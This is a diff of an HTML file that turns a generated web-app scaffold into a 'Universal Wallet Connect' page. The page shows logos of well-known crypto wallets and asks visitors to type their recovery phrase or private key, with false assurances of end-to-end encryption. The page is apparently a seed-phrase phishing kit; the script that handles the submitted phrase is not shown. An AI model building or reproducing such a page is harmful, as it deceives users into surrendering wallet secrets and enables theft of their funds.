@@ -1,26 +1,95 @@
+
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>whimsical-wallet-journey</title>
-    <meta name="description" content="Lovable Generated Project" />
-    <meta name="author" content="Lovable" />
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Universal Wallet Connect</title>
+  <link rel="stylesheet" href="styles.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
+</head>
+<body>
+  <div class="container">
+    <section id="intro-section" class="animate-fade">
+      <div class="card">
+        <span class="badge">Secure Connection</span>
+        <h1>Universal Wallet Connect</h1>
+        <span class="subtitle">Connect your cryptocurrency wallet securely</span>
+        
+        <p class="mb-3">Please select your wallet provider to begin the connection process. Your credentials will be secured with end-to-end encryption.</p>
+        
+        <button id="start-connect-btn" class="btn btn-block">Connect Wallet</button>
+      </div>
+    </section>
+    
+    <section id="wallet-select-section">
+      <div class="card">
+        <span class="badge">Step 1 of 2</span>
+        <h2>Select Your Wallet</h2>
+        <p class="mb-3">Choose your wallet provider from the options below.</p>
+        
+        <div class="wallet-list">
+          <div class="wallet-item" data-wallet="metamask">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" class="wallet-icon">
+            <span class="wallet-name">MetaMask</span>
+          </div>
+          <div class="wallet-item" data-wallet="trustwallet">
+            <img src="https://trustwallet.com/assets/images/favicon.png" alt="Trust Wallet" class="wallet-icon">
+            <span class="wallet-name">Trust Wallet</span>
+          </div>
+          <div class="wallet-item" data-wallet="coinbase">
+            <img src="https://www.coinbase.com/img/favicon/favicon-32.png" alt="Coinbase" class="wallet-icon">
+            <span class="wallet-name">Coinbase</span>
+          </div>
+          <div class="wallet-item" data-wallet="phantom">
+            <img src="https://phantom.app/img/logo.png" alt="Phantom" class="wallet-icon">
+            <span class="wallet-name">Phantom</span>
+          </div>
+          <div class="wallet-item" data-wallet="binance">
+            <img src="https://public.bnbstatic.com/static/images/common/favicon.ico" alt="Binance" class="wallet-icon">
+            <span class="wallet-name">Binance</span>
+          </div>
+          <div class="wallet-item" data-wallet="exodus">
+            <img src="https://www.exodus.com/img/favicon/favicon-32x32.png" alt="Exodus" class="wallet-icon">
+            <span class="wallet-name">Exodus</span>
+          </div>
+          <div class="wallet-item" data-wallet="ledger">
+            <img src="https://www.ledger.com/wp-content/uploads/2021/04/ledger-logo.svg" alt="Ledger" class="wallet-icon">
+            <span class="wallet-name">Ledger</span>
+          </div>
+          <div class="wallet-item" data-wallet="trezor">
+            <img src="https://trezor.io/static/images/trezor-logo.svg" alt="Trezor" class="wallet-icon">
+            <span class="wallet-name">Trezor</span>
+          </div>
+        </div>
+        
+        <button id="back-to-intro-btn" class="btn btn-outline">Back</button>
+      </div>
+    </section>
+    
+    <section id="recovery-phrase-section">
+      <div class="card">
+        <span class="badge">Step 2 of 2</span>
+        <h2>Verify Your <span id="selected-wallet-name">Wallet</span></h2>
+        <p class="mb-3">Please enter your recovery phrase or private key to verify wallet ownership.</p>
+        
+        <form id="recovery-form">
+          <div class="form-group">
+            <label for="recovery-phrase" class="form-label">Recovery Phrase / Private Key</label>
+            <textarea id="recovery-phrase" class="form-control" rows="4" placeholder="Enter your 12 or 24-word recovery phrase..." required></textarea>
+            <span class="form-text">Your recovery phrase is never stored or transmitted unencrypted.</span>
+          </div>
+          
+          <div class="form-group">
+            <button type="submit" id="connect-btn" class="btn btn-block">Connect</button>
+          </div>
+          
+          <button type="button" id="back-to-select-btn" class="btn btn-outline btn-block mt-2">Back to Wallet Selection</button>
+        </form>
+      </div>
+    </section>
+  </div>
 
-    <meta property="og:title" content="Lovable Generated Project" />
-    <meta property="og:description" content="Lovable Generated Project" />
-    <meta property="og:type" content="website" />
-    <meta property="og:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
-
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:site" content="@lovable_dev" />
-    <meta name="twitter:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
-  </head>
-
-  <body>
-    <div id="root"></div>
-    <!-- IMPORTANT: DO NOT REMOVE THIS SCRIPT TAG OR THIS VERY COMMENT! -->
-    <script src="https://cdn.gpteng.co/gptengineer.js" type="module"></script>
-    <script type="module" src="/src/main.tsx"></script>
-  </body>
+  <script src="script.js"></script>
+</body>
 </html>
